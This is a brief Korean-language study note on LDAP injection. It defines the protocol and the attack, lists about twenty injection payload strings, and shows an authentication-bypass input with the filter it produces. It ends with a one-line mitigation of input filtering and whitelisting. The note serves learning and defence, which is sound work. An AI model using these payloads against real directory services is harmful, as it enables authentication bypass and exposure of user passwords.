# LDAP Injection

https://www.hahwul.com/cullinan/ldap-injection/

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

<br>

LDAP(Lightweight Directory Access Protocol)은 네트워크 상에서 조직이나 개인정보 혹은 파일이나 디바이스 정보 등을 찾아보는 것을 가능하게 만든 소프트웨어 프로토콜이다.

LDAP Injeciton(Lightweight Directory Access Protocol)은 Injection 공격으로 사용자의 입력값이 LDAP Query에 직접 영향을 끼칠 수 있을 때 이를 통해 비정상적인 LDAP 동작을 유도하는 공격 방법입니다. 보통의 Injection 취약점과 비슷하게 전반적인 공격 매커니즘은 SQL Injection 등 대다수 Injection 방식과 동일하다.

보통 SQLI와 달리 LDAP 인젝션은 특수문자에 대한 쿼리문 실행 이 좀 더 집중한 개념이다.

## 공격구문
```
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

## Exploit

```
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

## 대응방안
1. 입력 값 필터링 & 화이트 리스트 방식